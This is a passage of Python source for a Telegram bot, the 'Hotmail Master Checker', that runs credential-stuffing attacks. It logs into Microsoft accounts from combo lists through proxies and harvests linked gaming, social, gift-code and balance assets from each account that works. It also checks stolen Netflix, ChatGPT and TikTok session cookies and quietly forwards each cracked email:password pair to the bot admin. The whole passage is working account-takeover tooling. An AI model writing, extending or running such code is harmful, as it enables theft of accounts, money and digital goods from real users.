            '600k-699k':0,'700k-799k':0,'800k-899k':0,'900k-999k':0,'1m+':0}

    def inc(self,f,v=1):
        with self.lock: setattr(self,f,getattr(self,f)+v)
    def add(self,f,item):
        with self.lock: getattr(self,f).append(item)

class CheckerSession:
    def __init__(self,user_id:int,combos:list):
        self.user_id=user_id; self.combos=combos; self.stats=CheckerStats()
        self.stats.total=len(combos); self.stats.valid=len(combos)
        self.proxies=init_proxies()
        self.stop_event=threading.Event()
        self.finished=False; self.started=time.time()
        self.msg_id=None; self.chat_id=None
        self.executor=None; self.futures=[]

class InboxStats:
    def __init__(self):
        self.lock=threading.Lock()
        self.total=0; self.checked=0; self.hits=0; self.bad=0; self.errors=0; self.retries=0; self.proxy_err=0
        self.psn=0; self.games=0; self.social=0; self.apps=0; self.payment=0; self.proxy_svc=0; self.streaming=0
        self.tiktok_links=0; self.instagram_links=0; self.facebook_links=0; self.twitter_links=0
        self.hits_list=[]; self.bad_list=[]; self.error_list=[]

class InboxCheckerSession:
    def __init__(self,user_id:int,combos:list):
        self.user_id=user_id; self.combos=combos; self.stats=InboxStats()
        self.stats.total=len(combos); self.proxies=init_proxies()
        self.stop_event=threading.Event(); self.finished=False
        self.started=time.time(); self.msg_id=None; self.chat_id=None
        self.executor=None; self.futures=[]

class CookieStats:
    def __init__(self):
        self.lock=threading.Lock()
        self.total=0; self.checked=0; self.hits=0; self.free=0; self.bad=0; self.errors=0; self.proxy_err=0; self.retries=0
        self.hits_list=[]; self.free_list=[]; self.bad_list=[]; self.error_list=[]

class CookieCheckerSession:
    def __init__(self,user_id:int,service:str,cookie_files:list):
        # cookie_files = [(source_name, cookies_dict), ...]
        self.user_id=user_id; self.service=service; self.cookie_files=cookie_files
        self.stats=CookieStats(); self.stats.total=len(cookie_files)
        self.proxies=init_proxies(); self.stop_event=threading.Event()
        self.finished=False; self.started=time.time()
        self.msg_id=None; self.chat_id=None
        self.executor=None; self.futures=[]
        self.seen=set(); self.seen_lock=threading.Lock()

# ══════════════════════════════════════════════════════════
#  MESSAGE BUILDERS
# ══════════════════════════════════════════════════════════

def build_status_message(cs):
    st=cs.stats
    elapsed=time.time()-cs.started
    cpm=int((st.checked/elapsed)*60) if elapsed>1 else 0
    eta_s=((st.valid-st.checked)/(st.checked/elapsed)) if st.checked>0 and elapsed>0 else 0
    el_str=time.strftime("%H:%M:%S",time.gmtime(elapsed))
    eta_str=time.strftime("%H:%M:%S",time.gmtime(eta_s)) if eta_s>0 else "--:--:--"
    bar=make_progress_bar(st.checked,st.valid,20)
    total_hits=len(st.all_hits)
    return f"""{E_ROCKET} {bold('Hotmail Master Checker')}
{E_GEAR} {italic(DEV_TAG)}

{E_CHART} {bold('Progress:')}
{mono(bar)}
{mono(f'{st.checked}/{st.valid}')} | {E_BOLT} CPM: {mono(str(cpm))}
{E_CLOCK} {mono(el_str)} | ETA: {mono(eta_str)}

{E_FIRE} {bold('Hits:')} {mono(str(total_hits))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GAME} {bold('PSN:')} {mono(str(st.psn))}    {E_GAME} {bold('Steam:')} {mono(str(st.steam))}
{E_GAME} {bold('Supercell:')} {mono(str(st.supercell))} {E_MUSIC} {bold('TikTok:')} {mono(str(st.tiktok))}
{E_CAMERA} {bold('Instagram:')} {mono(str(st.instagram))} {E_GAME} {bold('Minecraft:')} {mono(str(st.minecraft))}
{E_KEY} {bold('Xbox Codes:')} {mono(str(st.xbox_codes))}  {E_GIFT} {bold('Xbox Pulled:')} {mono(str(st.xbox_pulled))} (Valid: {mono(str(st.xbox_pulled_valid))})
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GIFT} {bold('Discord Valid:')} {mono(f'{st.discord_valid}/{st.discord_total}')}
{E_GIFT} {bold('Discord Claimed:')} {mono(str(st.discord_claimed))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_MONEY} {bold('Balance >$0:')} {mono(str(st.balance))}
{E_STAR} {bold('RP Hits:')} {mono(str(st.rp_hits))} ({mono(str(st.rp_total_pts))} pts)
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_DIAMOND} {bold('XGPU:')} {mono(str(st.xgpu))}  {bold('XGPP:')} {mono(str(st.xgpp))}
{E_DIAMOND} {bold('XGPE:')} {mono(str(st.xgpe))}  {bold('M365:')} {mono(str(st.m365))}
{E_DIAMOND} {bold('Other Svc:')} {mono(str(st.other_svc))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_RED} {bold('Bad:')} {mono(str(st.bad))}   {E_YELLOW} {bold('2FA:')} {mono(str(st.twofa))}
{E_RED} {bold('Errors:')} {mono(str(st.errors))}  {E_ORANGE} {bold('Retries:')} {mono(str(st.retries))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GEAR} {italic(DEV_TAG)}"""

def build_summary_message(cs,stopped=False):
    st=cs.stats
    elapsed=time.time()-cs.started
    cpm=int((st.checked/elapsed)*60) if elapsed>1 else 0
    el_str=time.strftime("%H:%M:%S",time.gmtime(elapsed))
    total_hits=len(st.all_hits)
    status_text=f"{E_STOP} Stopped by user" if stopped else f"{E_CHECK} Completed"
    return f"""{E_PARTY} {bold('Hotmail Master Checker - Summary')}
{E_GEAR} {italic(DEV_TAG)}

{bold('Status:')} {status_text}

{E_CHART} {bold('Stats:')}
{mono(f'Total Lines: {st.total}')}
{mono(f'Valid Combos: {st.valid}')}
{mono(f'Checked: {st.checked}')}
{mono(f'CPM: {cpm}')}
{mono(f'Duration: {el_str}')}

{E_FIRE} {bold(f'Total Hits: {total_hits}')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_GAME} PSN: {mono(str(st.psn))} | Steam: {mono(str(st.steam))}
{E_GAME} Supercell: {mono(str(st.supercell))} | TikTok: {mono(str(st.tiktok))}
{E_CAMERA} Instagram: {mono(str(st.instagram))} | Minecraft: {mono(str(st.minecraft))}
{E_KEY} Xbox Codes: {mono(str(st.xbox_codes))}
{E_GIFT} Discord: {mono(f'{st.discord_valid}/{st.discord_total}')} (Claimed: {st.discord_claimed})
{E_MONEY} Balance: {mono(str(st.balance))} | RP: {mono(str(st.rp_hits))} ({st.rp_total_pts} pts)
{E_DIAMOND} XGPU: {mono(str(st.xgpu))} | XGPP: {mono(str(st.xgpp))} | XGPE: {mono(str(st.xgpe))}
{E_DIAMOND} M365: {mono(str(st.m365))} | Other: {mono(str(st.other_svc))}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_RED} Bad: {mono(str(st.bad))} | 2FA: {mono(str(st.twofa))}
{E_RED} Errors: {mono(str(st.errors))} | Retries: {mono(str(st.retries))}

{E_GEAR} {italic(DEV_TAG)}"""

def _build_inbox_status_msg(cs):
    st=cs.stats
    elapsed=time.time()-cs.started
    cpm=int((st.checked/elapsed)*60) if elapsed>1 else 0
    el_str=time.strftime("%H:%M:%S",time.gmtime(elapsed))
    bar=make_progress_bar(st.checked,st.total,20)
    return f"""{E_ROCKET} {bold('Inboxer')}
{E_GEAR} {italic(DEV_TAG)}

{E_CHART} {mono(bar)}
{mono(f'{st.checked}/{st.total}')} | {E_BOLT} CPM: {mono(str(cpm))}
{E_CLOCK} {mono(el_str)}

{E_FIRE} {bold('Hits:')} {mono(str(st.hits))}
{E_GAME} PSN: {mono(str(st.psn))} | Games: {mono(str(st.games))}
{E_CAMERA} Social: {mono(str(st.social))} | Apps: {mono(str(st.apps))}
{E_MONEY} Payment: {mono(str(st.payment))} | Proxy: {mono(str(st.proxy_svc))}
{E_MUSIC} Streaming: {mono(str(st.streaming))}

TikTok Links: {mono(str(st.tiktok_links))}
IG Links: {mono(str(st.instagram_links))}
FB Links: {mono(str(st.facebook_links))}
Twitter Links: {mono(str(st.twitter_links))}

{E_RED} Bad: {mono(str(st.bad))} | Errors: {mono(str(st.errors))}
{E_GEAR} {italic(DEV_TAG)}"""

def send_hit_to_admin(email,pwd,cat,det,user):
    try:
        fn=user.first_name or ""; ln=user.last_name or ""
        full=f"{fn} {ln}".strip() or "User"
        lnk=f'<a href="https://t.me/{user.username}">{full}</a>' if user.username else f'<a href="tg://user?id={user.id}">{full}</a>'
        msg=f"""{E_BOOM} {bold('NEW HIT!')}
\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501
{E_KEY} {bold('Type:')} {mono(cat)}
{E_USER} {bold('Combo:')} {mono(f'{email}:{pwd}')}
{E_STAR} {bold('Details:')} {mono(det[:300])}
{E_USER} {bold('Checked by:')} {lnk}
{E_GEAR} {italic(DEV_TAG)}"""
        bot.send_message(ADMIN_ID,msg,parse_mode="HTML",disable_web_page_preview=True)
    except: pass

# ══════════════════════════════════════════════════════════
#  RESULTS / EXPORT
# ══════════════════════════════════════════════════════════

def get_bot_username():
    try:
        info=bot.get_me()
        if info and info.username: return f"@{info.username}"
    except: pass
    return "@HotmailMasterBot"

def build_hits_text(cs):
    lines=[f"{em}:{pw} | {cat} | {det}" for em,pw,cat,det in cs.stats.all_hits]
    return "\n".join(lines) if lines else "No hits found yet."

def build_result_zip(cs,user=None):
    st=cs.stats; ts=datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tmpdir=tempfile.mkdtemp(prefix="checker_")
    odir=os.path.join(tmpdir,f"results_{ts}"); os.makedirs(odir,exist_ok=True)
    bot_username=get_bot_username()
    def w(fn,lines):
        with open(os.path.join(odir,fn),"w",encoding="utf-8") as f:
            for l in lines: f.write(l+"\n")
    w("all_hits.txt",[f"{em}:{pw} | {cat} | {det}" for em,pw,cat,det in st.all_hits])
    svc_lines=[]
    for em,pw,svcs in st.svc_results:
        svc_lines.append(f"{em}:{pw}")
        for i,s in enumerate(svcs):
            pfx="  +-- " if i==len(svcs)-1 else "  |-- "
            svc_lines.append(pfx+f"[{s}]")
        svc_lines.append("-"*50)
    w("services_hits.txt",svc_lines)
    all_svc_lines=[]
    for em,pw,svcs in st.all_services:
        all_svc_lines.append(f"{em}:{pw}")
        for i,s in enumerate(svcs):
            pfx="  +-- " if i==len(svcs)-1 else "  |-- "
            all_svc_lines.append(pfx+f"[{s}]")
        all_svc_lines.append("-"*50)
    w("all_services.txt",all_svc_lines)
    w("balance_hits.txt",[f"{em}:{pw} | ${bal} {cur} | {holder}" for em,pw,bal,cur,holder in st.balance_list])
    w("rp_hits.txt",[f"[{pts}] {em}:{pw}" for em,pw,pts in sorted(st.rp_list,key=lambda x:x[2],reverse=True)])
    w("discord_promos.txt",[f"{em}:{pw} | {lnk} | {s2}" for em,pw,lnk,s2,*_ in st.discord_list])
    w("xbox_codes.txt",[f"{em}:{pw} | {code} | {title}" for em,pw,code,title in st.xbox_code_list])
    nitro_dir=os.path.join(odir,"Nitro_Pulled"); os.makedirs(nitro_dir,exist_ok=True)
    def w_nitro(fn,items):
        with open(os.path.join(nitro_dir,fn),"w",encoding="utf-8") as f:
            for item in items:
                em,pw,lnk,status2=item[0],item[1],item[2],item[3]
                f.write(f"{em}:{pw}:{status2}:{lnk}\n")
    w_nitro("Nitro_Valid.txt",[i for i in st.discord_list if i[3]=="unclaimed"])
    w_nitro("Nitro_Invalid.txt",[i for i in st.discord_list if i[3]=="claimed"])
    w_nitro("Nitro_Unknown.txt",[i for i in st.discord_list if i[3] not in ["unclaimed","claimed"]])
    xbox_dir=os.path.join(odir,"xbox_pulled"); os.makedirs(xbox_dir,exist_ok=True)
    for fn,key in [("valid_xbox_codes.txt","VALID"),("already_claimed.txt","REDEEMED"),
                   ("expired.txt","EXPIRED"),("invalid.txt","INVALID"),("unknown_codes.txt","UNKNOWN")]:
        with open(os.path.join(xbox_dir,fn),"w",encoding="utf-8") as f:
            for em,pw,name,code in st.xbox_pulled_by_status.get(key,[]):
                f.write(f"{em}:{pw} \u2013 {name} \u2013 {code}\n")
    w("psn_hits.txt",[f"{em}:{pw} | Count: {n}" for em,pw,n in st.psn_list])
    w("steam_hits.txt",[f"{em}:{pw} | Count: {n}" for em,pw,n in st.steam_list])
    w("supercell_hits.txt",[f"{em}:{pw} | {','.join(g) if isinstance(g,list) else g}" for em,pw,g in st.supercell_list])
    tt_lines=[]
    for em,pw,tt in st.tiktok_list:
        if isinstance(tt,dict):
            flw=tt.get('followers',0); verified=" ✓" if tt.get('verified') else ""
            tt_lines.append(f"{em}:{pw} | @{tt.get('username','N/A')} | Followers: {flw:,}{verified}")
        else: tt_lines.append(f"{em}:{pw} | {tt}")
    w("tiktok_hits.txt",tt_lines)
    ig_lines=[]
    for em,pw,ig in st.instagram_list:
        if isinstance(ig,dict):
            flw=ig.get('followers',0); verified=" ✓" if ig.get('verified') else ""
            ig_lines.append(f"{em}:{pw} | @{ig.get('username','N/A')} | Followers: {flw:,}{verified}")
        else: ig_lines.append(f"{em}:{pw} | {ig}")
    w("instagram_hits.txt",ig_lines)
    w("minecraft_hits.txt",[f"{em}:{pw} | {n}" for em,pw,n in st.minecraft_list])
    w("bad.txt",st.bad_list); w("2fa.txt",st.twofa_list); w("errors.txt",st.error_list)
    elapsed=time.time()-cs.started; cpm=int((st.checked/elapsed)*60) if elapsed>1 else 0
    checked_by="N/A"; checked_by_link=""
    if user:
        fn2=user.first_name or ""; ln2=user.last_name or ""
        checked_by=f"{fn2} {ln2}".strip() or "User"
        checked_by_link=f"@{user.username}" if user.username else f"tg://user?id={user.id}"
    tiktok_top=sorted(st.tiktok_followers_ranges.items(),key=lambda x:x[1],reverse=True)[:3]
    instagram_top=sorted(st.instagram_followers_ranges.items(),key=lambda x:x[1],reverse=True)[:3]
    tt_ranges_str=", ".join([f"{r}:{c}" for r,c in tiktok_top if c>0]) or "None"
    ig_ranges_str=", ".join([f"{r}:{c}" for r,c in instagram_top if c>0]) or "None"
    w("summary.txt",["Hotmail Master Checker - Summary","",DEV_TAG,f"Bot: {bot_username}","",
        f"Checked by: {checked_by} ({checked_by_link})",
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}","",
        f"Total Lines: {st.total} | Valid: {st.valid} | Checked: {st.checked} | CPM: {cpm}","",
        "--- RESULTS ---",
        f"PSN: {st.psn} | STEAM: {st.steam} | SUPERCELL: {st.supercell}",
        f"TIKTOK: {st.tiktok} (Ranges: {tt_ranges_str})",
        f"INSTAGRAM: {st.instagram} (Ranges: {ig_ranges_str})",
        f"MINECRAFT: {st.minecraft} | XBOX CODES: {st.xbox_codes}",
        f"DISCORD: {st.discord_total} (Valid: {st.discord_valid}, Claimed: {st.discord_claimed})",
        f"BALANCE >$0: {st.balance} | RP HITS: {st.rp_hits} ({st.rp_total_pts} pts)",
        f"XGPU: {st.xgpu} | XGPP: {st.xgpp} | XGPE: {st.xgpe} | M365: {st.m365} | OTHER: {st.other_svc}","",
        "--- NEGATIVES ---",
        f"BAD: {st.bad} | 2FA: {st.twofa} | ERRORS: {st.errors} | RETRIES: {st.retries}"])
    zip_path=os.path.join(tmpdir,f"results_master_{ts}.zip")
    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
        for root,dirs,files2 in os.walk(odir):
            for file2 in files2:
                fp=os.path.join(root,file2)
                zf.write(fp,os.path.relpath(fp,tmpdir))
    return zip_path,tmpdir

def send_backup(chat_id,reason="Manual backup"):
    try:
        if not os.path.exists(DB_FILE):
            bot.send_message(chat_id,f"{E_CROSS} DB file not found."); return
        with open(DB_FILE,"rb") as f:
            bot.send_document(chat_id,f,caption=f"{E_FILE} DB Backup\n{E_MEMO} {reason}\n{E_GEAR} {DEV_TAG}")
    except Exception as e:
        bot.send_message(chat_id,f"{E_CROSS} Backup failed: {mono(str(e))}",parse_mode="HTML")

def send_full_bot_backup(chat_id,reason="Manual full backup"):
    tmpdir=tempfile.mkdtemp()
    zip_path=os.path.join(tmpdir,f"full_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
    with zipfile.ZipFile(zip_path,'w',zipfile.ZIP_DEFLATED) as zf:
        for fn in ["main.py","config.json","db.json","proxies.txt","admin_proxies.txt"]:
            fp=os.path.join(_BASE,fn)
            if os.path.exists(fp): zf.write(fp,fn)
        log_dir=os.path.join(_BASE,"LOGS")
        if os.path.exists(log_dir):
            for root,dirs,files2 in os.walk(log_dir):
                for file2 in files2:
                    fp=os.path.join(root,file2)
                    zf.write(fp,os.path.relpath(fp,_BASE))
        results_dir_local=os.path.join(_BASE,"results")
        if os.path.exists(results_dir_local):
            for root,dirs,files2 in os.walk(results_dir_local):
                for file2 in files2:
                    fp=os.path.join(root,file2)
                    zf.write(fp,os.path.relpath(fp,_BASE))
    with open(zip_path,"rb") as f:
        bot.send_document(chat_id,f,caption=f"📦 Full Bot Backup\n{E_MEMO} {reason}\n{E_GEAR} {DEV_TAG}")
    shutil.rmtree(tmpdir,ignore_errors=True)

# ══════════════════════════════════════════════════════════
#  RUNNERS
# ══════════════════════════════════════════════════════════

def run_checker(cs,message,user):
    chat_id=message.chat.id
    markup=types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"get_hits_{cs.user_id}"),
        types.InlineKeyboardButton(f"{E_STOP} Stop",callback_data=f"stop_check_{cs.user_id}")
    )
    status_msg=bot.send_message(chat_id,build_status_message(cs),parse_mode="HTML",
        reply_to_message_id=message.message_id,reply_markup=markup,disable_web_page_preview=True)
    cs.msg_id=status_msg.message_id; cs.chat_id=chat_id

    def updater():
        while not cs.finished and not cs.stop_event.is_set():
            try:
                markup2=types.InlineKeyboardMarkup(row_width=2)
                markup2.add(
                    types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"get_hits_{cs.user_id}"),
                    types.InlineKeyboardButton(f"{E_STOP} Stop",callback_data=f"stop_check_{cs.user_id}")
                )
                bot.edit_message_text(build_status_message(cs),chat_id=chat_id,message_id=cs.msg_id,
                    parse_mode="HTML",reply_markup=markup2,disable_web_page_preview=True)
            except: pass
            time.sleep(3)
    threading.Thread(target=updater,daemon=True).start()

    def _process_one(email,pwd):
        st=cs.stats
        if cs.stop_event.is_set(): return
        # Create per-call ProxyRotator
        pxr_inst=ProxyRotator(cs.proxies,True)
        sess,ms_status,access_token,cid=ms_login(email,pwd,pxr_inst)
        iss=ms_status.upper()

        with st.lock: st.checked+=1

        if iss=="BAD":
            with st.lock: st.bad+=1; st.bad_list.append(f"{email}:{pwd}")
            return
        elif iss in ("2FA","LOCKED"):
            with st.lock: st.twofa+=1; st.twofa_list.append(f"{email}:{pwd}")
            return
        elif iss!="OK":
            with st.lock: st.errors+=1; st.error_list.append(f"{email}:{pwd}")
            return

        # VALID HIT — do all the expensive checks outside the lock
        svcs=check_services(sess,email)
        svc_names=[sv["name"] for sv in svcs]
        det=" | ".join(fmt_svc(sv) for sv in svcs) or "Valid Microsoft"

        bal,cur,holder=check_balance(sess)
        rp_pts=check_rp(sess)
        xbl=get_xbl(sess)
        discord_promos_raw=check_discord(sess,xbl,pxr_inst) if xbl else []
        xbox_code_pairs=check_xbox_codes(sess)
        psn_count=check_psn(sess,access_token,cid) if access_token else 0
        steam_count=check_steam(sess,access_token,cid) if access_token else 0
        sc_games=check_supercell(sess,access_token,cid) if access_token else []
        tt=check_tiktok(sess,access_token,cid) if access_token else None
        ig=check_instagram(sess,access_token,cid) if access_token else None
        mc_name,mc_id=check_minecraft_via_xbox(sess)
        mc_mail_count=0
        if not mc_name and access_token:
            mc_mail_count=check_minecraft_via_mail(sess,access_token,cid)

        # Check discord promos
        discord_results=[]
        for dc_link,_ in discord_promos_raw:
            dc_s=disc_status(dc_link,pxr_inst)
            discord_results.append((dc_link,dc_s))

        with st.lock:
            st.hits+=1
            st.all_hits.append((email,pwd,"Hit",det))
            st.svc_results.append((email,pwd,svc_names))
            st.all_services.append((email,pwd,svc_names))
            for sv in svcs:
                cat=classify_svc(sv["name"])
                if cat=="xgpu": st.xgpu+=1
                elif cat=="xgpp": st.xgpp+=1
                elif cat=="xgpe": st.xgpe+=1
                elif cat=="m365": st.m365+=1
                else: st.other_svc+=1
            if bal and bal>0:
                st.balance+=1; st.balance_list.append((email,pwd,bal,cur or "USD",holder or ""))
            if rp_pts and rp_pts>0:
                st.rp_hits+=1; st.rp_total_pts+=rp_pts; st.rp_list.append((email,pwd,rp_pts))
            for dc_link,dc_s in discord_results:
                st.discord_total+=1
                st.discord_list.append((email,pwd,dc_link,dc_s,det))
                if dc_s=="unclaimed": st.discord_valid+=1
                elif dc_s=="claimed": st.discord_claimed+=1
                else: st.discord_unk+=1
            for code,title in xbox_code_pairs:
                st.xbox_codes+=1; st.xbox_code_list.append((email,pwd,code,title))
            if psn_count and psn_count>0:
                st.psn+=1; st.psn_list.append((email,pwd,psn_count))
            if steam_count and steam_count>0:
                st.steam+=1; st.steam_list.append((email,pwd,steam_count))
            if sc_games:
                st.supercell+=1; st.supercell_list.append((email,pwd,sc_games))
            if tt:
                st.tiktok+=1; st.tiktok_list.append((email,pwd,tt))
                rng=_get_followers_range(tt.get("followers",0))
                st.tiktok_followers_ranges[rng]=st.tiktok_followers_ranges.get(rng,0)+1
            if ig:
                st.instagram+=1; st.instagram_list.append((email,pwd,ig))
                rng=_get_followers_range(ig.get("followers",0))
                st.instagram_followers_ranges[rng]=st.instagram_followers_ranges.get(rng,0)+1
            if mc_name:
                st.minecraft+=1; st.minecraft_list.append((email,pwd,mc_name))
            elif mc_mail_count and mc_mail_count>0:
                st.minecraft+=1; st.minecraft_list.append((email,pwd,"via-mail"))

        send_hit_to_admin(email,pwd,"Hit",det,user)
        if st.checked%50==0: pxr_inst.refresh_from_global_pool()

    cs.executor=ThreadPoolExecutor(max_workers=MASTER_THREADS)
    cs.futures=[cs.executor.submit(_process_one,em,pw) for em,pw in cs.combos]
    for future in as_completed(cs.futures):
        if cs.stop_event.is_set(): break
    cs.finished=True; cs.executor.shutdown(wait=False)
    st=cs.stats
    try:
        markup_final=types.InlineKeyboardMarkup(row_width=2)
        markup_final.add(
            types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"get_hits_{cs.user_id}"),
            types.InlineKeyboardButton(f"{E_STOP} Stopped",callback_data=f"stop_done_{cs.user_id}")
        )
        bot.edit_message_text(build_summary_message(cs,stopped=cs.stop_event.is_set()),
            chat_id=chat_id,message_id=cs.msg_id,parse_mode="HTML",reply_markup=markup_final,disable_web_page_preview=True)
    except: pass
    # Send results zip
    try:
        zip_path,tmpdir=build_result_zip(cs,user)
        with open(zip_path,"rb") as f:
            bot.send_document(chat_id,f,caption=f"{E_PARTY} Results\n{E_FIRE} Hits: {len(st.all_hits)}\n{E_GEAR} {DEV_TAG}")
        shutil.rmtree(tmpdir,ignore_errors=True)
    except Exception as e:
        bot.send_message(chat_id,f"{E_CROSS} Results zip failed: {mono(str(e))}",parse_mode="HTML")
    # Update global stats
    db_inst=load_db(); g=db_inst.get("global_stats",{})
    g["total_checked"]=g.get("total_checked",0)+st.checked
    g["total_hits"]=g.get("total_hits",0)+len(st.all_hits)
    g["total_lines_checked"]=g.get("total_lines_checked",0)+st.total
    db_inst["global_stats"]=g
    u=get_user(db_inst,cs.user_id)
    u["total_checked"]+=st.checked; u["total_hits"]+=len(st.all_hits)
    u["total_lines"]+=st.total; u["checks_count"]+=1
    save_db(db_inst)


def run_inbox_checker(cs,message,user):
    chat_id=message.chat.id
    markup=types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"ib_get_hits_{cs.user_id}"),
        types.InlineKeyboardButton(f"{E_STOP} Stop",callback_data=f"ib_stop_{cs.user_id}")
    )
    status_msg=bot.send_message(chat_id,_build_inbox_status_msg(cs),parse_mode="HTML",
        reply_to_message_id=message.message_id,reply_markup=markup,disable_web_page_preview=True)
    cs.msg_id=status_msg.message_id; cs.chat_id=chat_id

    def updater():
        while not cs.finished and not cs.stop_event.is_set():
            try:
                markup2=types.InlineKeyboardMarkup(row_width=2)
                markup2.add(
                    types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"ib_get_hits_{cs.user_id}"),
                    types.InlineKeyboardButton(f"{E_STOP} Stop",callback_data=f"ib_stop_{cs.user_id}")
                )
                bot.edit_message_text(_build_inbox_status_msg(cs),chat_id=chat_id,message_id=cs.msg_id,
                    parse_mode="HTML",reply_markup=markup2,disable_web_page_preview=True)
            except: pass
            time.sleep(3)
    threading.Thread(target=updater,daemon=True).start()

    def _process_one(email,pwd):
        st=cs.stats
        if cs.stop_event.is_set(): return
        result=check_inbox_account(email,pwd,cs.proxies)
        with st.lock:
            st.checked+=1
            if result.get("retries",0)>0: st.retries+=result["retries"]
            status=result.get("status","error")
            if status in ("hit","valid"):
                st.hits+=1; st.hits_list.append(result)
                folder_map=result.get("folder_map",{})
                if folder_map.get("PSN"): st.psn+=1
                if folder_map.get("Games"): st.games+=1
                if folder_map.get("Social"): st.social+=1
                if folder_map.get("Apps"): st.apps+=1
                if folder_map.get("Payment"): st.payment+=1
                if folder_map.get("Proxy"): st.proxy_svc+=1
                social_links=result.get("social_links",{})
                if "TikTok" in social_links: st.tiktok_links+=1
                if "Instagram" in social_links: st.instagram_links+=1
                if "Facebook" in social_links: st.facebook_links+=1
                if "Twitter/X" in social_links: st.twitter_links+=1
            elif status=="bad": st.bad+=1; st.bad_list.append(f"{email}:{pwd}")
            else: st.errors+=1; st.error_list.append(f"{email}:{pwd}")
        if status in ("hit","valid"):
            try:
                det=" | ".join(result.get("services",[])) or "Services detected"
                bot.send_message(ADMIN_ID,f"{E_BOOM} {bold('INBOX HIT!')}\n{E_USER} {mono(f'{email}:{pwd}')}\n{E_STAR} {mono(det)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
            except: pass

    cs.executor=ThreadPoolExecutor(max_workers=INBOXER_THREADS)
    cs.futures=[cs.executor.submit(_process_one,em,pw) for em,pw in cs.combos]
    for future in as_completed(cs.futures):
        if cs.stop_event.is_set(): break
    cs.finished=True; cs.executor.shutdown(wait=False)
    try:
        markup_final=types.InlineKeyboardMarkup(row_width=2)
        markup_final.add(
            types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"ib_get_hits_{cs.user_id}"),
            types.InlineKeyboardButton(f"{E_STOP} Done",callback_data=f"ib_done_{cs.user_id}")
        )
        bot.edit_message_text(_build_inbox_status_msg(cs),chat_id=chat_id,message_id=cs.msg_id,
            parse_mode="HTML",reply_markup=markup_final,disable_web_page_preview=True)
    except: pass


def run_cookie_checker(cs,message,user):
    chat_id=message.chat.id
    svc_label={"netflix":"🎬 Netflix","chatgpt":"🤖 ChatGPT","tiktok":"🎵 TikTok"}.get(cs.service,cs.service.title())
    markup=types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton(f"{E_FIRE} Get Hits",callback_data=f"ck_get_hits_{cs.user_id}"),
        types.InlineKeyboardButton(f"{E_STOP} Stop",callback_data=f"ck_stop_{cs.user_id}")
    )
    status_msg=bot.send_message(chat_id,f"{E_ROCKET} {bold(f'Cookie Checker — {svc_label}')}\n{E_GEAR} Starting...",
        parse_mode="HTML",reply_to_message_id=message.message_id,reply_markup=markup,disable_web_page_preview=True)
    cs.msg_id=status_msg.message_id; cs.chat_id=chat_id

    def _process_one(source,cookies_dict):
        st=cs.stats
        if cs.stop_event.is_set(): return
        # Dedup
        uid_key="|".join(f"{k}:{v[:40]}" for k,v in sorted(cookies_dict.items())
                         if "session" in k.lower() or k in ("oai-sc","sessionid","sid_tt","NetflixId"))
        if not uid_key:
            uid_key="|".join(f"{k}:{v[:30]}" for k,v in sorted(cookies_dict.items())[:3])
        with cs.seen_lock:
            if uid_key in cs.seen:
                with st.lock: st.checked+=1
                return
            cs.seen.add(uid_key)
        svc=cs.service; px_list=cs.proxies
        if svc=="netflix":
            result,status=check_netflix_cookie(cookies_dict,px_list)
            with st.lock:
                st.checked+=1
                if result:
                    content_str,filename=format_hit_netflix(result,cookies_dict,source)
                    st.hits+=1; st.hits_list.append((source,result,cookies_dict,content_str,filename))
                elif status=="expired":
                    st.bad+=1; st.bad_list.append(source)
                else:
                    st.errors+=1; st.error_list.append(source)
        elif svc=="chatgpt":
            result,status=check_chatgpt_cookie(cookies_dict,px_list)
            with st.lock:
                st.checked+=1
                if result:
                    content_str,filename=format_hit_chatgpt(result,cookies_dict,source)
